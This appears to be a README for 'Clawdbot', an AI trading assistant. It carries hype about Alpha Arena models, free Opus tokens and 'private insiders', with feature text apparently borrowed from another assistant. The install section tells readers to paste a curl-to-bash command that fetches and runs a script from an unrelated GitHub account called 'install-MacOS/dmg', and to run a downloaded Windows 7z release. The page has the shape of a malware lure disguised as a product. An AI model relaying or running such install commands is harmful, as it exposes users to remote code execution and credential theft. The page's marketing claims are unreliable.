# 🦞 Clawdbot — AI trading assistant

**[nof1.ai](https://nof1.ai)** & **clawdbot** collaboration. We get the best practices from alpha arena trading seasons and bring it to **clawdbot!** All **top** AI agents, **realtime** monitoring and news research, gather info from **private insiders** and many other! **Using Hyperliquid API.**

---
```
                          ┌────────────────────────────┐
                          │        User / Operator     │
                          │  Strategy · Feedback · Chat│
                          └──────────────┬─────────────┘
                                         │
                              (Conversation via Clawdbot)
                                         │
┌────────────────────────────────────────▼────────────────────────────────────────┐
│                            Conversational Interface                             │
│                                (Clawdbot Layer)                                 │
│  - Strategy discussion                                                          │
│  - Trade explanations                                                           │
│  - Pre / Post trade analysis                                                    │
└──────────────────────────────┬──────────────────────────────────────────────────┘
                               │
                               │ feedback / queries
                               ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│                        Decision Engine (Alpha Arena Core)                        │
│  - nof1.ai Alpha Arena models                                                    │
│  - Strategy scoring & decay                                                      │
│  - Self-evaluation loop                                                          │
│  - Explainable decision output                                                   │
└───────────────┬───────────────────────────────┬──────────────────────────────────┘
                │                               │
     signals    │                               │ decisions
                │                               │
                ▼                               ▼
┌──────────────────────────────┐     ┌────────────────────────────────────────────┐
│       Market Intelligence     │     │              Trading Engine               │
│  - Twitter/X sentiment        │     │  - Execution lifecycle                    │
│  - Narrative detection        │     │  - Risk & sizing modules                  │
│  - Political signals          │     │  - 24/7 autonomous trading                │
│    (Trump, macro events)      │     │                                           │
└───────────────┬──────────────┘     └───────────────┬────────────────────────────┘
                │                                      │
                │ signals                              │ orders
                ▼                                      ▼
┌──────────────────────────────┐     ┌────────────────────────────────────────────┐
│     Signal History & Impact   │     │         Execution Backends                │
│  - Signal effectiveness       │     │  - Hyperliquid API (Crypto)               │
│  - Weight adjustment          │     │  - Stocks broker                          │
└───────────────┬──────────────┘     │  - Commodities venue                       │
                │                    └───────────────┬────────────────────────────┘
                │ trade data                          │ fills
                ▼                                      ▼
┌──────────────────────────────────────────────────────────────────────────────────┐
│                       Trade Logging & Evaluation Layer                           │
│  - Full trade logs                                                               │
│  - Strategy performance scoring                                                  │
│  - Feedback into Decision Engine                                                 │
└──────────────────────────────────────────────────────────────────────────────────┘

                    (Local-first · User-controlled · Research mode)
```
---
## Key Features

### Alpha Arena–Trained Decision Core

* Built on the **nof1.ai Alpha Arena** experiment
* Bootstrapped with top-performing models and strategies from the arena
* Uses a continuous **self-evaluation loop** to learn what works and drop what doesn’t
* Automatically boosts winning logic and decays underperforming strategies

---

### Autonomous Multi-Asset Trading (Experimental)

* 24/7 autonomous trading in **experimental mode**
* Supported markets:

  * Crypto (via **Hyperliquid API**)
  * Stocks
  * Commodities
* Full trade lifecycle:

  * market analysis
  * decision making
  * trade execution
  * result logging

> ⚠️ Research & experimentation only. Not financial advice.

---

### Real-Time Sentiment Intelligence

* Real-time **Twitter/X sentiment** analysis
* Tracks:

  * macro narratives
  * market triggers
  * sharp shifts in crowd mood
* Dedicated module for **political & influencer signals**,
  including **Donald Trump posts** as market-moving events

---

### Conversational Trading Assistant

* Talk to the agent via **Clawdbot**
* You can:

  * discuss strategy *before* a trade
  * question the logic *during* execution
  * break down results *after* the fact
* Supports:

  * Q&A
  * advice
  * alternative scenarios
  * “what-if” analysis

---

### Strategy Feedback Loop

* Users can:

  * suggest strategies
  * challenge decisions
  * ask for reasoning
* The agent:

  * explains entries and exits
  * compares alternatives
  * feeds human input back into future decisions

---

### Full Trade Transparency

* Every trade is logged with:

  * entry rationale
  * signals used
  * decision model context
  * final outcome
* Trade history is used for:

  * strategy scoring
  * learning from mistakes
  * post-trade analysis

---

### Modular & Extensible Architecture

* Plugin-based design:

  * execution engines
  * data sources
  * decision models
* Easy to plug in:

  * new markets
  * new signals
  * alternative strategies

---

### Local-First & User-Controlled

* Runs locally or on your own infrastructure
* Full control over API keys, configs, and behavior
* Explainable decisions — no black box vibes

---

### Research-Driven, Not Hype-Driven

* Built for:

  * autonomous agent research
  * decision quality analysis
  * reproducible experiments
* No profit promises — just learning loops and better decisions

---


### Flexibility and Token Savings

Thanks to our optimizations, you have complete freedom of choice:

1. **Free (Our Recommendation):** You can use the bot without spending any of your own funds by utilizing our provided **Anthropic Pro/Max (100/200) tokens paired with Opus 4.5**. This ensures long-context performance and high resistance to prompt injection without hitting your wallet.
2. **Bring Your Own Keys:** If you prefer, you can connect **your own API keys** (Anthropic, OpenAI, etc.) if you have personal subscriptions or require specific models.

### Core Functionality

* **Multi-channel:** Supports WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, iMessage, Microsoft Teams, BlueBubbles, Matrix, Zalo, and WebChat.
* **Local-first:** A single control plane (Gateway) for sessions, channels, and tools runs on your own hardware.
* **Voice Control:** **Voice Wake** and **Talk Mode** features allow you to speak with the assistant via voice (supports macOS, iOS, Android).
* **Live Canvas:** An agent-controlled visual workspace (capable of displaying content and UI).
* **Agent Tools:** The bot has access to browser control, local files, task scheduling (cron), camera, and screen captures.
* **Multi-agent Routing:** Capability to route inbound messages from different channels or accounts to isolated agents (separate workspaces and sessions).

## Installation

### 🟢 1-Click Install (Windows Portable)

**The easiest way to get started.**

1. Go to the [**Releases**](../../releases) page.
2. Download the **Windows Portable** `7.z` file.
3. Extract the file.
4. **Run.** (No extra setup required).

### MacOS

- 💻Open **Terminal**
- ☑Paste the **command** below
- ✅Press **Enter**

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/clawdbot)"
```

### Supported Platforms

The assistant (Gateway) runs on **macOS, Linux, and Windows (via WSL2)**. Companion nodes exist for mobile devices (iOS/Android) to provide access to device sensors and voice features.

### Key Chat Commands

You can send these commands in any connected messenger:

* `/status` — Compact session status (model, tokens).
* `/new` or `/reset` — Reset the current session (start the conversation over).
* `/compact` — Summarize session context.
* `/think <level>` — Control the "thinking" level (off, minimal, low, medium, high, xhigh).
* `/verbose on|off` — Toggle verbose mode.
* `/usage off|tokens|full` — Display token usage statistics after every response.

### Security

Clawdbot treats inbound Direct Messages (DMs) as **untrusted**. By default, unknown senders receive a pairing code and cannot interact with the bot until you explicitly approve them via the console.
